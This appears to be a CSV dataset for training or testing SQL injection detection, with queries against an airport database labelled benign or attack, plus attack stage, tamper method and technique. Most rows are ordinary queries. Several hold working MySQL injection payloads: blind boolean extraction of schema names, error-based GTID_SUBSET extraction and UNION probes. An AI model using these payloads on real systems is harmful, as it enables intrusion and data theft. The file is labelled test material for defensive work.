full_query,label,user_inputs,attack_stage,tamper_method,attack_status,statement_type,query_template_id,attack_id,attack_technique,split
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Jindal Heliport"" and 5099=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 17,1),6,1))>102) then 5099 else (select 6777 union select 1186) end))-- -""",1," Jindal Heliport  and 5099=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 17,1),6,1))>102) then 5099 else (select 6777 union select 1186) end))-- - ",exploit,lowercase,success,select,airport-S3,boolean-168,boolean,test
"DELETE FROM regions WHERE name = ""South Region"" AND 4163 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 18,1),5,1))>113) THEN 4163 ELSE (SELECT 5270 UNION SELECT 1703) END))-- -"";",1," South Region"" AND 4163 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 18,1),5,1))>113) THEN 4163 ELSE (SELECT 5270 UNION SELECT 1703) END))-- - ",exploit,equaltolike,success,delete,airport-D8,boolean-150,boolean,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""SE-BD""",0,EU SE-BD,,,,select,airport-S8,,,train
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""CN"") OR a.elevation_ft > 3291.0",0,CN 3291.0,,,,select,airport-S11,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""AR-B""",0,EU AR-B,,,,select,airport-S8,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 650.0 AND 83.0",0,650.0 83.0,,,,select,airport-S2,,,train
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""La Jibarera"") OR name LIKE ""LL69""",0,La Jibarera LL69,,,,select,airport-S10,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""MQ"" OR c.name LIKE CONCAT(""%"", ""Maldives"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,MQ Maldives 3,,,,select,airport-S20,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""PH-0504"", ""heliport"", ""Jinshan City Beach Seaplane Base"", 29.822399139404297, -62.8457984924, 1650.0)",0,PH-0504 heliport Jinshan City Beach Seaplane Base 29.822399139404297 -62.8457984924 1650.0,,,,insert,airport-I2,,,test
SELECT * FROM airport WHERE icao_code = 'KMLT';,0,KMLT,,,,select,airport-S1,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""SLPA"";",0,SLPA,,,,select,airport-S7,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""French Cay"";",0,French Cay,,,,select,airport-S15,,,test
"INSERT INTO countries (code, name, continent) VALUES (""BI"", ""Pitcairn"", ""EU"")",0,BI Pitcairn EU,,,,insert,airport-I7,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""IT""",0,IT,,,,select,airport-S9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""DM"" GROUP BY r.name ORDER BY r.name ASC;",0,DM,,,,select,airport-S16,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Little River Airport"");",0,Little River Airport,,,,select,airport-S12,,,test
"UPDATE airport SET municipality = ""Zhilga"" WHERE iso_country = ""AR""",0,Zhilga AR,,,,update,airport-U2,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Fairbury Municipal Airport""",0,Fairbury Municipal Airport,,,,select,airport-S3,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""6MN7"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""YAH"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Аэропорт Красногорье"", ""%"");",0,6MN7 YAH Аэропорт Красногорье,,,,select,airport-S17,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Carnicobar"") OR name LIKE ""Campo di Volo """"Creva Air Club""""""",0,"Carnicobar Campo di Volo """"Creva Air Club""""",,,,select,airport-S10,,,test
"DELETE FROM navaids WHERE ident = ""RVA"";",0,RVA,,,,delete,airport-D6,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""NO"") OR a.elevation_ft > 482.0",0,NO 482.0,,,,select,airport-S11,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Meggiana Altiport""",0,Meggiana Altiport,,,,select,airport-S3,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Crystal_City-Pilot_Mound/Louise_Municipal_Airport"" WHERE ident = ""BR-2364""",0,https://en.wikipedia.org/wiki/Crystal_City-Pilot_Mound/Louise_Municipal_Airport BR-2364,,,,update,airport-U3,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-0102"";",0,US-0102,,,,select,airport-S7,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Cayuga Medical Center Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Cayuga Medical Center Heliport,,,,select,airport-S14,,,test
"DELETE FROM countries WHERE code = ""AU"";",0,AU,,,,delete,airport-D7,,,train
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""SDAJ"",""small_airport"", ""Fazenda Londrina II Airport"",""https://en.wikipedia.org/wiki/Daegu_Airport'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#"",""AS"")",1," SDAJ small_airport Fazenda Londrina II Airport https://en.wikipedia.org/wiki/Daegu_Airport'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL# AS ",recon,commentbeforeparentheses,failure,insert,airport-I3,union-14,union,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 162.0 AND GTID_SUBSET(CONCAT(0x717a787671,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e617661696473 AND table_schema=0x64617461736574 LIMIT 8,1),0x7170786a71),7718) AND 162.0 AND GTID_SUBSET(CONCAT(0x717a787671,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e617661696473 AND table_schema=0x64617461736574 LIMIT 8,1),0x7170786a71),7718)",1," 162.0 GTID_SUBSET(CONCAT(0x717a787671,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e617661696473 table_schema=0x64617461736574 LIMIT 8,1),0x7170786a71),7718) 162.0 GTID_SUBSET(CONCAT(0x717a787671,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e617661696473 table_schema=0x64617461736574 LIMIT 8,1),0x7170786a71),7718)",exploit,sleep2getlock,success,select,airport-S2,error-163,error,test
"DELETE FROM countries WHERE code = ""IL"";",0,IL,,,,delete,airport-D7,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""HR-05"", ""South Kurdufan State"", ""AF"", ""EE"", ""https://en.wikipedia.org/wiki/Municipality_of_Hoče-Slivnica"", ""-5713"")) as sTia where 5181=5181 or MAKE_SET(4890=4890,5539)-- BSrm"")",1," HR-05 South Kurdufan State AF EE https://en.wikipedia.org/wiki/Municipality_of_Hoče-Slivnica -5713 ) as sTia where 5181=5181 or MAKE_SET(4890=4890,5539)-- BSrm ",recon,lowercase,success,insert,airport-I4,boolean-18,boolean,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Sangermano,ACLI"") OR name LIKE ""Аэродром Тапа, EETA""",0,"Sangermano,ACLI Аэродром Тапа, EETA",,,,select,airport-S10,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BH"" GROUP BY r.name ORDER BY r.name ASC;",0,BH,,,,select,airport-S5,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""ZZ"" OR c.name LIKE CONCAT(""%"", ""Barbados"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,ZZ Barbados 3,,,,select,airport-S20,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""CL-ML""",0,AS CL-ML,,,,select,airport-S8,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""BH-13"", ""Central Region"", ""EU"", ""IE"", ""https://en.wikipedia.org/wiki/K%C3%A9mo"", ""Airports in Antioquía Department"")",0,BH-13 Central Region EU IE https://en.wikipedia.org/wiki/K%C3%A9mo Airports in Antioquía Department,,,,insert,airport-I4,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Kazo;""",0,Kazo,,,,select,airport-S21,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('CA-0504','WBKN','KAVQ','LPJF');",0,CA-0504 WBKN KAVQ LPJF,,,,update,airport-U10,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Lawa_Tabiki_Airstrip"" WHERE ident = ""CN27""",0,https://en.wikipedia.org/wiki/Lawa_Tabiki_Airstrip CN27,,,,update,airport-U3,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Bergen Airport, Flesland"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,"Bergen Airport, Flesland",,,,select,airport-S14,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (25906, ""LZPP"", 4000.0, ""TURF"", 0, 0)",0,25906 LZPP 4000.0 TURF 0 0,,,,insert,airport-I9,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 123.0 AND  130.45  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  126.7  AND  120.6  ORDER BY frequency;",0,123.0 130.45 126.7 120.6,,,,select,airport-S13,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""CW"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,CW 5,,,,select,airport-S19,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 780.0 AND 2513.0",0,780.0 2513.0,,,,select,airport-S2,,,test
"SELECT * FROM airport WHERE gps_code = ""HTSO"" OR local_code = ""CBF5""",0,HTSO CBF5,,,,select,airport-S4,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""SY9, Senneterre Water Aerodrome"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""II90"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""7WA6"", ""%"");",0,"SY9, Senneterre Water Aerodrome II90 7WA6",,,,select,airport-S17,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""London Airport"") OR name LIKE ""London Airport""",1, London Airport London Airport ,recon,randomcase,success,select,airport-S10,time-214,time,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 128.0 AND  121.5  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  118.3  AND  130.2  ORDER BY frequency;",0,128.0 121.5 118.3 130.2,,,,select,airport-S13,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 132.45 AND  126.2  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  118.9  AND  132.1  ORDER BY frequency;",0,132.45 126.2 118.9 132.1,,,,select,airport-S13,,,test
SHOW GLOBAL STATUS ,0,,,,,admin,airport-admin5,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Tver Oblast"";",0,Tver Oblast,,,,select,airport-S15,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Монгохто, Каменный Ручей"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""FL14"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""E21"", ""%"");",0,"Монгохто, Каменный Ручей FL14 E21",,,,select,airport-S17,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Epirus"";",0,Epirus,,,,select,airport-S15,,,test
"UPDATE countries SET keywords = ""Sierra Leonean airports""  WHERE   4339=4339   AND    4531=(   SELECT   (   CASE    WHEN    (   ORD(    MID((   SELECT       IFNULL(  CAST( column_name    AS       NCHAR   ),0x20)  FROM  INFORMATION_SCHEMA.   COLUMNS   WHERE       table_name  =0x6e617661696473   AND    table_schema=0x64617461736574     LIMIT   11,1),11,1))>108)     THEN    4531    ELSE    (   SELECT   9011   UNION        SELECT   8235)  END ))-- -"" WHERE code = ""IO"";",1," Sierra Leonean airports""  WHERE   4339=4339   AND    4531=(   SELECT   (   CASE    WHEN    (   ORD(    MID((   SELECT       IFNULL(  CAST( column_name    AS       NCHAR   ),0x20)  FROM  INFORMATION_SCHEMA.   COLUMNS   WHERE       table_name  =0x6e617661696473   AND    table_schema=0x64617461736574     LIMIT   11,1),11,1))>108)     THEN    4531    ELSE    (   SELECT   9011   UNION        SELECT   8235)  END ))-- - IO ",exploit,multiplespaces,success,update,airport-U8,boolean-96,boolean,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""US-FL""",0,SA US-FL,,,,select,airport-S8,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('JP-2118','JP-2118','JP-2118','JP-2118');",1, JP-2118 JP-2118 JP-2118 JP-2118 ,recon,multiplespaces,success,update,airport-U10,stacked-111,stacked,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""5884"" AS SIGNED) AND a.iso_country = ""LU"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,5884 LU,,,,select,airport-S22,,,train
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (50436, 19036, ""KLRY"", ""TWR"", ""APP"", 124.9)",0,50436 19036 KLRY TWR APP 124.9,,,,insert,airport-I8,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""US-KS""",0,EU US-KS,,,,select,airport-S8,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""LI"" OR c.name LIKE CONCAT(""%"", ""Georgia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",0,LI Georgia 4,,,,select,airport-S20,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""47M"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Manatuto"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in Kiribati"", ""%"");",0,47M Airports in Manatuto Airports in Kiribati,,,,select,airport-S18,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Karibib;""",0,Karibib,,,,select,airport-S21,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""FR-1131"", ""heliport"", ""Temblador Airport')) UNIOn aLl SELECt nULl-- -"", 36.9874992371, 53.67729)",1, FR-1131 heliport Temblador Airport'   UNIOn aLl SELECt nULl-- - 36.9874992371 53.67729 ,recon,randomcase,failure,insert,airport-I1,union-2,union,test
